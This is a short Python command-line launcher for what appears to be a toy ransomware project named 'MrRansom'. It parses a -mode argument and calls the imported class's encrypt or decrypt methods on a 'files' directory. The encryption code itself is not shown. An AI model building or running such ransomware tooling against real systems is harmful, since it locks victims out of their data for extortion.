import argparse

from script.mrransom import MrRansom


class EncryptAction(argparse.Action):

    def __init__(self, option_strings, dest, nargs=None, **kwargs):
        if nargs is not None:
            raise ValueError("nargs not allowed")
        super(EncryptAction, self).__init__(option_strings, dest, **kwargs)

    def __call__(self, parser, namespace, values, option_string=None):
        ransom = MrRansom("files", 15)

        if values == 'encrypt':
            ransom.encrypt()
        elif values == 'decrypt':
            ransom.decrypt()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Mr. Ransom. Encrypts your precious files.')
    parser.add_argument('-mode', action=EncryptAction, help='Encrypt all the files')

    args = parser.parse_args()
